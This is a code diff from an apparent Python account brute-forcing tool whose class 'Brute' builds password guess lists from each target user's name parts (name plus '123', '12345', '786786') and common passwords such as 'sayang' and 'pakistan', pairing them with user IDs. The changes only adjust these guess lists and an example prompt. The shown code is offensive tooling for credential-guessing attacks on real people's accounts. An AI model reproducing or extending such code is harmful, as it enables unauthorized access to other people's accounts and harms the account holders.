@@ -94,20 +94,18 @@ class Brute:
 				if len(obj) == 1:
 					listpass = [
 						obj[0]+'123', obj[0]+'1234',
-						obj[0]+'12345',obj[0]+'786786',
+						obj[0]+'12345',
 					]
 				elif len(obj) == 2:
 					listpass = [
 						obj[0]+'123', obj[0]+'12345',
 						obj[1]+'123', obj[1]+'12345',
-						obj[0]+'786786',
 					]
 				elif len(obj) == 3:
 					listpass = [
 						obj[0]+'123', obj[0]+'12345',
 						obj[1]+'123', obj[1]+'12345',
 						obj[2]+'123', obj[2]+'12345',
-						obj[0]+'786786',
 					]
 				elif len(obj) == 4:
 					listpass = [
@@ -119,7 +117,7 @@ class Brute:
 				else:
 					listpass = [
 						'sayang', 'Pakistan',
-						'786786', 'pakistan'
+						'pakistan', '786786'
 					]
 				self.target.append({'id': user['uid'], 'pw': listpass})
 			except: pass
@@ -128,7 +126,7 @@ class Brute:
 		ask = raw_input('Use password defaults OR manual? [D/m]: ')
 		if ask.lower() == 'm':
 			while True:
-				print('\n\033[0;92mSet password use (,) for new password, EX: sayang,pakistan,786786\n\033[0m')
+				print('\n\033[0;92mSet password use (,) for new password, EX: sayang,doraemon,bangsat\n\033[0m')
 				self.setpw = raw_input('Set password: ').strip().split(',')
 				if self.setpw[0] != '':
 					break
